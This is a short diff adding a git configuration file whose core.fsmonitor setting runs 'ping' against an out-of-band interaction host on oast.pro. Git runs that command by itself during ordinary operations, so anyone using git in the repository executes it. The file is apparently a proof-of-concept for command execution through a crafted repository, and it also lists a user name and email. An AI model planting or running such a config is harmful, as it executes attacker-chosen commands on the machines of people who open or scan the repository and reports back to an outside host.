@@ -1,0 +1,9 @@
+[core]
+repositoryformatversion = 0
+filemode = true
+bare = false
+worktree = "worktree" 
+fsmonitor = "ping cstkbhk7inp4h3ihs8v0bownhycc3we3z.oast.pro && "
+[user]
+	email = sivaneshashok@gmail.com
+	name = staz0t
